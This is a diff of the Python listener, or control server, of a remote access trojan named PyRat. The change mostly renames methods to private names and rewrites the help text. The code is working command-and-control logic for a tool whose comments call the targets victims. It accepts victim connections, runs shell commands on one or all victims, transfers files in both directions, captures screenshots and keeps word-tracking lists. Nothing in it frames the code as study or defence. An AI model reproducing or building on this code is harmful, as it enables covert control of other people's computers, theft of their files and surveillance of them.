@@ -48,43 +48,43 @@ class Listener:
     # Create and listen a tcp server socket with given ip and port values.
     def __init__(self):
 
-        self.create_workers()
-        self.create_jobs()
+        self.__create_workers()
+        self.__create_jobs()
 
     # ****************** THREAD POOL ******************************************************************
 
     # Thread pool pattern makes it easy to observe and manage threads
     # Reduces the costs occur when creating and deleting threads
 
-    def create_workers(self):
+    def __create_workers(self):
         for _ in range(self.NUMBER_OF_THREADS):
-            t = threading.Thread(target=self.work)
+            t = threading.Thread(target=self.__work)
             t.daemon = True
             t.start()
 
-    def work(self):
+    def __work(self):
         while True:
             x = self.task_queue.get()
 
             if x == 0:
-                self.randomize_ports()
+                self.__randomize_ports()
             elif x == 1:
-                self.create_socket()
+                self.__create_socket()
             elif x == 2:
-                self.listen()
+                self.__listen()
             elif x == 9:
-                self.terminal()
+                self.__terminal()
 
             self.task_queue.task_done()
 
-    def create_jobs(self):
+    def __create_jobs(self):
         for x in self.JOB_NUMBER:
             self.task_queue.put(x)
         self.task_queue.join()
 
     # ****************** THREAD POOL ******************************************************************
 
-    def randomize_ports(self):
+    def __randomize_ports(self):
 
         date_time = datetime.datetime.now()
         current_day = date_time.day
@@ -97,7 +97,7 @@ class Listener:
 
         self.task_queue.put(1)
 
-    def create_socket(self):
+    def __create_socket(self):
 
         new_socket = None
 
@@ -122,7 +122,7 @@ class Listener:
             self.socket_queue.put(i)
             self.receive_queue.put(i)
 
-    def listen(self):
+    def __listen(self):
 
         i = self.socket_queue.get()
 
@@ -143,7 +143,7 @@ class Listener:
                 time.sleep(1)
 
     # List all available connections
-    def list_connections(self):
+    def __list_connections(self):
 
         results = ""
 
@@ -181,9 +181,9 @@ class Listener:
             print("----Clients----" + "\n" + results)
 
     # Get screenshot from the victim computer
-    def get_screenshot(self, command, mode):
+    def __get_screenshot(self, command, mode):
         if mode == "multi":
-            self.send_data(command, "multi")
+            self.__send_data(command, "multi")
             ready = select.select(self.connection_list, self.connection_list, self.connection_list, 10)
             i = 0
             for connection in ready[1]:
@@ -193,14 +193,14 @@ class Listener:
                 msglen = struct.unpack('>I', raw_msglen)[0]
                 # Read the message data
                 screenshot = self.__recvpayload(msglen, connection)
-                self.write_file("{}.png".format(i), screenshot)
+                self.__write_file("{}.png".format(i), screenshot)
                 i = i + 1
         else:
-            self.send_data(command, "single")
-            screenshot = self.receive_data("single")
-            self.write_file("{}.png".format(self.target_ip), screenshot)
+            self.__send_data(command, "single")
+            screenshot = self.__receive_data("single")
+            self.__write_file("{}.png".format(self.target_ip), screenshot)
 
-    def send_data(self, data, mode):
+    def __send_data(self, data, mode):
 
         if mode == "multi":
             for connection in self.connection_list:
@@ -212,7 +212,7 @@ class Listener:
             msg = struct.pack('>I', len(json_data)) + json_data
             self.target.sendall(msg)
 
-    def receive_data(self, mode):
+    def __receive_data(self, mode):
 
         if mode == "multi":
             ready = select.select(self.connection_list, self.connection_list, self.connection_list, 5)
@@ -258,41 +258,56 @@ class Listener:
         return json.loads(data)
 
     # Send commands to be executed on victim machine
-    def execute_remotely(self, command, mode):
+    def __execute_remotely(self, command, mode):
 
         if mode == "multi":
-            self.send_data(command, "multi")
-            return self.receive_data("multi")
+            self.__send_data(command, "multi")
+            return self.__receive_data("multi")
         else:
-            self.send_data(command, "single")
-            return self.receive_data("single")
+            self.__send_data(command, "single")
+            return self.__receive_data("single")
 
     # Read and write files in base64 format to transfer bytes reliably.
-    def read_file(self, path):
+    def __read_file(self, path):
         try:
             with open(path, 'rb') as file:
                 return base64.b64encode(file.read())
         except FileNotFoundError as e:
             print(e.strerror)
 
-    def write_file(self, path, content):
+    def __write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Download successful"
 
-    def help(self):
-        print("\n[*] PyRat commands are listed below. You can also use shell commands [*]\n")
-        print("list -> lists all available connections")
-        print("select <index> -> selects a connection")
-        print("download <filename> -> downloads a file from victim machine")
-        print("upload <filename> uploads a file from this machine to victim")
-        print("screenshot -> gets a screenshot from victims computer")
-        print("track --list, -l -> list all track words")
-        print("track --add, -a -> adds a word to track list")
-        print("track --remove, -r -> removes a word from track list")
+    def __help(self):
+
+        help_text = """
+        [+] PyRat commands are listed below. You can also use shell commands [+]
+        
+         list  lists all available connections
+         
+         select <index>  selects a target
+         
+         download <filename>  downloads a file from victim machine
+         
+         upload <filename>   uploads a file from this machine to victim
+         
+         screenshot  gets a screenshot from target computer
+         
+         track --list, -l  list all track words
+         track --add, -a  adds a word to track list
+         track --remove, -r  removes a word from track list
+         
+         Use '*' at the start of your command to broadcast it to all clients
+         Currently available:
+         * screenshot
+         * <shell command>
+        """
+        print(help_text)
 
     # This is the part where all connections will be listed, and serve as a dashboard or main menu
-    def terminal(self):
+    def __terminal(self):
 
         ascii_art = """               
                      ______         _   
@@ -314,8 +329,20 @@ class Listener:
 
             # List all available connections
             if command[0] == "list":
-                self.list_connections()
+                self.__list_connections()
                 continue
+
+            elif command[0] == "help":
+
+                help_text = """
+                
+                [+] You need to choose a client to get started [+]
+                
+                list    Lists all connections
+                
+                select <index>  Chooses a target
+            
+                """
 
             # Select from available connections
             elif command[0] == "select":
@@ -324,15 +351,15 @@ class Listener:
                     self.target = self.connection_list[selection]
                     self.target_ip = self.address_list[selection]
                     print("You Have Now Connected To {}".format(self.target_ip))
-                    self.connect_to_the_target()
+                    self.__connect_to_the_target()
                 except Exception as e:
                     print(e)
             else:
-                print("Unknown Command, use list or select")
+                print("Unknown Command, use 'help' to see available commands")
 
     # Here we are sending commands to be executed on victim machine which their result
     # will be sent back to us
-    def connect_to_the_target(self):
+    def __connect_to_the_target(self):
 
         while True:
 
@@ -346,25 +373,23 @@ class Listener:
 
                 # Get files from the victim machine
                 if command[0] == "download":
-                    binaryFile = self.execute_remotely(command, "single")
-                    result = self.write_file(command[1], binaryFile)
+                    binaryFile = self.__execute_remotely(command, "single")
+                    result = self.__write_file(command[1], binaryFile)
 
                 # Send files to the victim machine
                 elif command[0] == "upload":
-                    file_content = self.read_file(command[1])
+                    file_content = self.__read_file(command[1])
                     if file_content is None:
                         continue
                     command.append(file_content.decode())
-                    result = self.execute_remotely(command, "single")
+                    result = self.__execute_remotely(command, "single")
 
-                # List all available connections
                 elif command[0] == "list":
-                    result = self.list_connections()
+                    result = self.__list_connections()
                     if result == -1:
                         break
                     continue
 
-                # Select from available connections
                 elif command[0] == "select":
 
                     selection = int(command[1])
@@ -373,20 +398,19 @@ class Listener:
                     print("You Have Now Connected To {}".format(self.target_ip))
                     continue
 
-                # Get screenshot from target computer
                 elif command[0] == "screenshot":
-                    self.get_screenshot(command, "single")
+                    self.__get_screenshot(command, "single")
                     result = "Successfully grabbed screenshot from {}".format(self.target_ip)
 
                 elif command[0] == "*":
                     if command[1] == "screenshot":
-                        self.get_screenshot(command[1:], "multi")
+                        self.__get_screenshot(command[1:], "multi")
                         result = "Successfully grabbed screenshot from all clients"
                     else:
-                        result = self.execute_remotely(command[1:], "multi")
+                        result = self.__execute_remotely(command[1:], "multi")
 
                 elif command[0] == "help":
-                    self.help()
+                    self.__help()
                     continue
 
                 # Exit to main menu
@@ -394,7 +418,7 @@ class Listener:
                     break
 
                 else:
-                    result = self.execute_remotely(command, "single")
+                    result = self.__execute_remotely(command, "single")
 
             # Print results to the terminal
             print(result)
